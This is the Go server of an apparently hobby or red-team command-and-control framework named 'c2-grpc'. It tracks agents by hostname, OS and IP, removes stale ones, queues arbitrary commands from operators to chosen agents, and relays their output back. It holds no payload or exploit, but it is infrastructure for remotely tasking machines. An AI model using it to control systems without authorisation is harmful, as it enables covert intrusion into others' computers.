package main

import (
	"context"
	"fmt"
	"io"
	"log"
	"net"
	"sync"
	"time"

	pb "github.com/ardhptr21/c2-grpc/pb"
	"github.com/google/uuid"
	"google.golang.org/grpc"
	"google.golang.org/grpc/codes"
	"google.golang.org/grpc/status"
)

type Agent struct {
	Hostname string
	OS       string
	IP       string
	Status   string
	LastSeen time.Time
}

var (
	agentsMu sync.RWMutex
	agents   = make(map[string]*Agent)

	tasksMu sync.Mutex
	tasks   = make(map[string][]pb.Task)

	outputsMu sync.Mutex
	outputs   = make(map[string][]string)

	operatorsMu sync.Mutex
	operators   = make(map[string]pb.OperatorService_ConnectServer)

	agentStreamsMu sync.Mutex
	agentStreams   = make(map[string]pb.TaskService_ReceiveTasksServer)
)

type agentServer struct {
	pb.UnimplementedAgentServiceServer
}

type heartbeatServer struct {
	pb.UnimplementedHeartbeatServiceServer
}

type taskServer struct {
	pb.UnimplementedTaskServiceServer
}

type outputServer struct {
	pb.UnimplementedOutputServiceServer
}

type operatorServer struct {
	pb.UnimplementedOperatorServiceServer
}

func shortUUID(n int) string {
	return uuid.NewString()[:n]
}

func removeAgent(agentID string) (string, bool) {
	agentsMu.Lock()
	agent, ok := agents[agentID]
	if ok {
		delete(agents, agentID)
	}
	agentsMu.Unlock()
	if !ok {
		return "", false
	}

	tasksMu.Lock()
	delete(tasks, agentID)
	tasksMu.Unlock()

	agentStreamsMu.Lock()
	delete(agentStreams, agentID)
	agentStreamsMu.Unlock()

	return agent.Hostname, true
}

func removeAgentAndBroadcast(agentID string) {
	hostname, ok := removeAgent(agentID)
	if !ok {
		return
	}

	go broadcastToOperators(&pb.OperatorEvent{
		Type:    "agent_removed",
		AgentId: agentID,
		Payload: hostname,
	})
}

func broadcastToOperators(event *pb.OperatorEvent) {
	operatorsMu.Lock()
	streams := make([]pb.OperatorService_ConnectServer, 0, len(operators))
	for _, stream := range operators {
		streams = append(streams, stream)
	}
	operatorsMu.Unlock()

	for _, stream := range streams {
		_ = stream.Send(event)
	}
}

func startWatchdog() {
	ticker := time.NewTicker(3 * time.Second)
	defer ticker.Stop()

	for range ticker.C {
		var staleAgentIDs []string

		agentsMu.Lock()
		for id, agent := range agents {
			if time.Since(agent.LastSeen) > 10*time.Second {
				staleAgentIDs = append(staleAgentIDs, id)
			}
		}
		agentsMu.Unlock()

		for _, agentID := range staleAgentIDs {
			removeAgentAndBroadcast(agentID)
		}
	}
}

func (s *agentServer) Register(ctx context.Context, req *pb.RegisterRequest) (*pb.RegisterResponse, error) {
	agentsMu.Lock()
	defer agentsMu.Unlock()

	for _, agent := range agents {
		if agent.Hostname == req.GetHostname() {
			return nil, status.Error(codes.AlreadyExists, "hostname already registered")
		}
	}

	agentID := shortUUID(8)
	agents[agentID] = &Agent{
		Hostname: req.GetHostname(),
		OS:       req.GetOs(),
		IP:       req.GetIp(),
		Status:   "ALIVE",
		LastSeen: time.Now(),
	}

	tasksMu.Lock()
	tasks[agentID] = []pb.Task{}
	tasksMu.Unlock()

	go broadcastToOperators(&pb.OperatorEvent{
		Type:    "agent_joined",
		AgentId: agentID,
		Payload: fmt.Sprintf("%s @ %s", req.GetHostname(), req.GetIp()),
	})

	return &pb.RegisterResponse{
		AgentId: agentID,
		Message: fmt.Sprintf("Welcome, %s. Your ID is %s", req.GetHostname(), agentID),
	}, nil
}

func (s *agentServer) Unregister(ctx context.Context, req *pb.UnregisterRequest) (*pb.UnregisterResponse, error) {
	hostname, ok := removeAgent(req.GetAgentId())
	if !ok {
		return nil, status.Error(codes.NotFound, "agent not found")
	}

	go broadcastToOperators(&pb.OperatorEvent{
		Type:    "agent_removed",
		AgentId: req.GetAgentId(),
		Payload: hostname,
	})

	return &pb.UnregisterResponse{
		Success: true,
		Message: fmt.Sprintf("Agent %s removed", req.GetAgentId()),
	}, nil
}

func (s *heartbeatServer) SendHeartbeat(stream pb.HeartbeatService_SendHeartbeatServer) error {
	var count int32
	lastStatus := ""
	agentID := ""

	for {
		req, err := stream.Recv()
		if err == io.EOF {
			if agentID != "" {
				removeAgentAndBroadcast(agentID)
			}
			return stream.SendAndClose(&pb.HeartbeatSummary{
				TotalReceived: count,
				LastStatus:    lastStatus,
			})
		}
		if err != nil {
			if agentID != "" {
				removeAgentAndBroadcast(agentID)
			}
			return status.Error(codes.Internal, err.Error())
		}

		agentID = req.GetAgentId()

		agentsMu.Lock()
		if agent, ok := agents[agentID]; ok {
			agent.Status = normalizeStatus(req.GetStatus())
			agent.LastSeen = time.Now()
		}
		agentsMu.Unlock()

		count++
		lastStatus = req.GetStatus()
	}
}

func normalizeStatus(statusText string) string {
	switch statusText {
	case "alive":
		return "ALIVE"
	case "idle":
		return "IDLE"
	case "busy":
		return "BUSY"
	default:
		return "ALIVE"
	}
}

func (s *taskServer) ReceiveTasks(req *pb.TaskRequest, stream pb.TaskService_ReceiveTasksServer) error {
	agentsMu.RLock()
	_, ok := agents[req.GetAgentId()]
	agentsMu.RUnlock()
	if !ok {
		return status.Error(codes.NotFound, "agent not found")
	}

	agentStreamsMu.Lock()
	agentStreams[req.GetAgentId()] = stream
	agentStreamsMu.Unlock()

	tasksMu.Lock()
	queued := append([]pb.Task(nil), tasks[req.GetAgentId()]...)
	tasks[req.GetAgentId()] = nil
	tasksMu.Unlock()

	for i, task := range queued {
		if err := stream.Send(&task); err != nil {
			agentStreamsMu.Lock()
			delete(agentStreams, req.GetAgentId())
			agentStreamsMu.Unlock()

			tasksMu.Lock()
			tasks[req.GetAgentId()] = append(tasks[req.GetAgentId()], queued[i:]...)
			tasksMu.Unlock()
			return err
		}
	}

	<-stream.Context().Done()

	agentStreamsMu.Lock()
	delete(agentStreams, req.GetAgentId())
	agentStreamsMu.Unlock()

	return nil
}

func (s *outputServer) SendOutput(stream pb.OutputService_SendOutputServer) error {
	taskID := ""

	for {
		chunk, err := stream.Recv()
		if err == io.EOF {
			return stream.SendAndClose(&pb.OutputAck{
				TaskId:  taskID,
				Success: true,
			})
		}
		if err != nil {
			return status.Error(codes.Internal, err.Error())
		}

		taskID = chunk.GetTaskId()

		outputsMu.Lock()
		outputs[taskID] = append(outputs[taskID], chunk.GetLine())
		outputsMu.Unlock()

		broadcastToOperators(&pb.OperatorEvent{
			Type:    "output",
			AgentId: chunk.GetAgentId(),
			Payload: chunk.GetLine(),
		})
	}
}

func (s *operatorServer) Connect(stream pb.OperatorService_ConnectServer) error {
	opID := shortUUID(6)

	operatorsMu.Lock()
	operators[opID] = stream
	operatorsMu.Unlock()
	defer func() {
		operatorsMu.Lock()
		delete(operators, opID)
		operatorsMu.Unlock()
	}()

	type rosterEntry struct {
		id       string
		hostname string
		status   string
	}

	agentsMu.RLock()
	roster := make([]rosterEntry, 0, len(agents))
	for id, agent := range agents {
		roster = append(roster, rosterEntry{id: id, hostname: agent.Hostname, status: agent.Status})
	}
	agentsMu.RUnlock()

	for _, agent := range roster {
		if err := stream.Send(&pb.OperatorEvent{
			Type:    "agent_joined",
			AgentId: agent.id,
			Payload: fmt.Sprintf("%s [%s]", agent.hostname, agent.status),
		}); err != nil {
			return err
		}
	}

	errCh := make(chan error, 1)

	go func() {
		defer close(errCh)
		for {
			cmd, err := stream.Recv()
			if err == io.EOF || stream.Context().Err() != nil {
				errCh <- nil
				return
			}
			if err != nil {
				log.Printf("[server] operator recv error: %v", err)
				errCh <- err
				return
			}

			agentsMu.RLock()
			_, exists := agents[cmd.GetTargetAgentId()]
			agentsMu.RUnlock()
			if !exists {
				_ = stream.Send(&pb.OperatorEvent{
					Type:    "error",
					AgentId: cmd.GetTargetAgentId(),
					Payload: "ERROR: agent not found",
				})
				continue
			}

			taskID := shortUUID(6)
			task := pb.Task{
				TaskId:  taskID,
				Command: cmd.GetCommand(),
				Args:    cmd.GetArgs(),
			}
			pushTaskToAgent(cmd.GetTargetAgentId(), task)

			_ = stream.Send(&pb.OperatorEvent{
				Type:    "ack",
				AgentId: cmd.GetTargetAgentId(),
				Payload: fmt.Sprintf("Task %s dispatched: %s %s", taskID, cmd.GetCommand(), cmd.GetArgs()),
			})
		}
	}()

	select {
	case <-stream.Context().Done():
		return nil
	case err := <-errCh:
		return err
	}
}

func pushTaskToAgent(agentID string, task pb.Task) {
	agentStreamsMu.Lock()
	stream, ok := agentStreams[agentID]
	agentStreamsMu.Unlock()

	if ok {
		if err := stream.Send(&task); err == nil {
			return
		}
	}

	tasksMu.Lock()
	tasks[agentID] = append(tasks[agentID], task)
	tasksMu.Unlock()
}

func main() {
	lis, err := net.Listen("tcp", ":50051")
	if err != nil {
		log.Fatalf("listen error: %v", err)
	}

	log.Printf("[server] c2-grpc server running on %s", lis.Addr().String())

	s := grpc.NewServer()
	pb.RegisterAgentServiceServer(s, &agentServer{})
	pb.RegisterHeartbeatServiceServer(s, &heartbeatServer{})
	pb.RegisterTaskServiceServer(s, &taskServer{})
	pb.RegisterOutputServiceServer(s, &outputServer{})
	pb.RegisterOperatorServiceServer(s, &operatorServer{})

	go startWatchdog()

	if err := s.Serve(lis); err != nil {
		log.Fatalf("serve error: %v", err)
	}
}
